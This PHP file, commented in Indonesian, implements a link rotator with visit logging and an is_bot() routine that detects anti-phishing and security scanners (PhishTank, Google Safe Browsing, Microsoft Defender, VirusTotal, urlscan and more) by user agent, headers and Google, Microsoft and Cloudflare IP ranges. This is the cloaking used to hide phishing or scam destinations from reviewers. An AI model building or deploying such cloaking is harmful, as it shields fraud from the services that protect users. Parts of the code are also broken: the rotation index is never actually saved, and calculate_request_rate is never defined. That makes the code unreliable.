<?php
// Fungsi dasar untuk sistem rotator link

function load_links() {
    if (!file_exists('../data/links.json')) {
        file_put_contents('../data/links.json', json_encode([]));
    }
    return json_decode(file_get_contents('../data/links.json'), true);
}

function save_links($links) {
    file_put_contents('../data/links.json', json_encode($links, JSON_PRETTY_PRINT));
}

function load_logs() {
    if (!file_exists('../data/logs.json')) {
        file_put_contents('../data/logs.json', json_encode([]));
    }
    return json_decode(file_get_contents('../data/logs.json'), true);
}

function save_logs($logs) {
    file_put_contents('../data/logs.json', json_encode($logs, JSON_PRETTY_PRINT));
}

function generate_hash() {
    return bin2hex(random_bytes(8));
}

function get_link_by_hash($hash) {
    $links = load_links();
    foreach ($links as $link) {
        if ($link['hash'] === $hash) {
            return $link;
        }
    }
    return null;
}

function rotate_link($link) {
    if (empty($link['targets'])) {
        return null;
    }
    
    // Pilih metode rotasi
    if ($link['rotation_method'] === 'round-robin') {
        $last_index = $link['last_index'] ?? 0;
        $next_index = ($last_index + 1) % count($link['targets']);
        $link['last_index'] = $next_index;
        save_links(load_links()); // Simpan index terakhir
        return $link['targets'][$next_index];
    } else {
        // Random
        return $link['targets'][array_rand($link['targets'])];
    }
}

function log_visit($hash, $is_bot = false) {
    $logs = load_logs();
    
    $log_entry = [
        'hash' => $hash,
        'ip' => $_SERVER['REMOTE_ADDR'],
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
        'referer' => $_SERVER['HTTP_REFERER'] ?? '',
        'is_bot' => $is_bot,
        'country' => get_country_from_ip($_SERVER['REMOTE_ADDR']),
        'device' => get_device_type(),
        'timestamp' => time(),
        'date' => date('Y-m-d H:i:s')
    ];
    
    $logs[] = $log_entry;
    save_logs($logs);
}

function get_country_from_ip($ip) {
    // Gunakan API eksternal atau database lokal
    // Contoh sederhana dengan ip-api.com (gratis)
    if ($ip === '127.0.0.1') return 'Localhost';
    
    $url = "http://ip-api.com/json/{$ip}?fields=country";
    $response = @file_get_contents($url);
    
    if ($response) {
        $data = json_decode($response, true);
        return $data['country'] ?? 'Unknown';
    }
    
    return 'Unknown';
}

function get_device_type() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    
    if (strpos($user_agent, 'Mobile') !== false || 
        strpos($user_agent, 'Android') !== false || 
        strpos($user_agent, 'iPhone') !== false) {
        return 'Mobile';
    }
    
    return 'Desktop';
}

function is_bot() {
    $user_agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
    $ip = $_SERVER['REMOTE_ADDR'];
    $request_headers = getallheaders();

    // 1. Deteksi berdasarkan User-Agent khusus keamanan 2025
    $security_bots = [
        // Bot institusi keamanan
        'securityscan', 'trustwave', 'qualysguard', 'rapid7', 'tenable',
        'sucuri', 'imperva', 'cloudflare-security', 'akamai-bot',
        'f5-security', 'barracuda', 'fortinet', 'paloalto', 'symantec',
        
        // Bot anti-phishing/scraping
        'phishtank', 'google-safebrowsing', 'microsoft-defender',
        'apwg-ecrime', 'stopbadbot', 'phishfort', 'cert-bot',
        'sophos-web-filter', 'malwarebytes', 'kaspersky',
        
        // AI Security Crawlers
        'ai-security-scan', 'deepguard', 'neural-protect',
        'quantum-sec', 'zero-trust-verifier', 'sentinelbot',
        
        // Bot pelaporan/monitoring
        'abuseipdb', 'virustotal', 'urlscan', 'threatcrowd',
        'alienvault', 'talosintel', 'fireeye',
        
        // Bot scraping berbahaya
        'scrapy', 'selenium', 'headlesschrome', 'phantomjs',
        'nightmarejs', 'puppeteer', 'playwright'
    ];

    foreach ($security_bots as $bot) {
        if (strpos($user_agent, $bot) !== false) {
            log_bot_attempt($ip, "Security bot detected by UA: " . $bot);
            return true;
        }
    }

    // 2. Deteksi berdasarkan header HTTP khusus
    $security_headers = [
        'x-security-scan' => null,
        'x-phishing-verify' => null,
        'x-malware-detection' => null,
        'x-threat-intel' => null,
        'via' => function($val) { return str_contains($val, 'security-gateway'); }
    ];

    foreach ($security_headers as $header => $validator) {
        if (isset($request_headers[$header])) {
            if ($validator === null || $validator($request_headers[$header])) {
                log_bot_attempt($ip, "Security header detected: " . $header);
                return true;
            }
        }
    }

    // 3. Deteksi berdasarkan IP dari threat intelligence
    $threat_intel_ips = [
        // Cloudflare Security IPs
        '173.245.48.0/20', '103.21.244.0/22', '141.101.64.0/18',
        
        // Google Safe Browsing
        '64.233.160.0/19', '66.102.0.0/20', '72.14.192.0/18',
        
        // Microsoft Defender
        '13.64.0.0/16', '40.74.0.0/15', '52.184.0.0/17',
        
        // Known bad actor IP ranges
        '185.143.16.0/24', '45.133.182.0/24', '91.243.118.0/24'
    ];

    foreach ($threat_intel_ips as $cidr) {
        if (ip_in_range($ip, $cidr)) {
            log_bot_attempt($ip, "Threat intel IP range: " . $cidr);
            return true;
        }
    }

    // 4. Deteksi perilaku mencurigakan
    if (detect_suspicious_behavior()) {
        log_bot_attempt($ip, "Suspicious behavior detected");
        return true;
    }

    // 5. Deteksi headless browser
    if (detect_headless_browser($user_agent, $request_headers)) {
        log_bot_attempt($ip, "Headless browser detected");
        return true;
    }

    return false;
}

// Fungsi pendukung
function ip_in_range($ip, $cidr) {
    list($subnet, $mask) = explode('/', $cidr);
    $ip_long = ip2long($ip);
    $subnet_long = ip2long($subnet);
    $mask_long = ~((1 << (32 - $mask)) - 1);
    return ($ip_long & $mask_long) == ($subnet_long & $mask_long);
}

function detect_suspicious_behavior() {
    // 1. Rate limiting
    $request_rate = calculate_request_rate();
    if ($request_rate > 15) { // >15 requests/second
        return true;
    }

    // 2. Pola navigasi tidak wajar
    $request_path = $_SERVER['REQUEST_URI'] ?? '';
    $suspicious_paths = [
        '/wp-admin', '/phpmyadmin', '/.env', '/.git',
        '/admin', '/backup', '/config'
    ];
    
    foreach ($suspicious_paths as $path) {
        if (stripos($request_path, $path) !== false) {
            return true;
        }
    }

    // 3. Missing common headers
    if (!isset($_SERVER['HTTP_ACCEPT']) || 
        !isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {
        return true;
    }

    return false;
}

function detect_headless_browser($user_agent, $headers) {
    // Deteksi tanda-tanda headless browser
    $headless_indicators = [
        // User agent clues
        'headlesschrome', 'phantomjs', 'electron',
        
        // Missing plugins
        'navigator.plugins.length==0',
        
        // WebGL vendor/renderer
        'google inc', 'intel inc', 'microsoft'
    ];

    foreach ($headless_indicators as $indicator) {
        if (strpos($user_agent, $indicator) !== false) {
            return true;
        }
    }

    // Check for headless browser headers
    if (isset($headers['X-Headless']) || 
        isset($headers['X-Puppeteer']) ||
        (isset($headers['Accept']) && $headers['Accept'] === '*/*')) {
        return true;
    }

    return false;
}

function log_bot_attempt($ip, $reason) {
    $log_entry = sprintf(
        "[%s] Bot detected - IP: %s | Reason: %s | UA: %s | URL: %s\n",
        date('Y-m-d H:i:s'),
        $ip,
        $reason,
        $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
        $_SERVER['REQUEST_URI'] ?? 'Unknown'
    );
    
    file_put_contents(__DIR__.'/../data/bot_logs.log', $log_entry, FILE_APPEND);
}

function add_utm_parameters($url, $params) {
    if (empty($params)) return $url;
    
    $parsed = parse_url($url);
    $query = [];
    
    if (isset($parsed['query'])) {
        parse_str($parsed['query'], $query);
    }
    
    $query = array_merge($query, $params);
    
    $new_url = $parsed['scheme'] . '://' . $parsed['host'] . $parsed['path'];
    
    if (!empty($query)) {
        $new_url .= '?' . http_build_query($query);
    }
    
    if (isset($parsed['fragment'])) {
        $new_url .= '#' . $parsed['fragment'];
    }
    
    return $new_url;
}
?>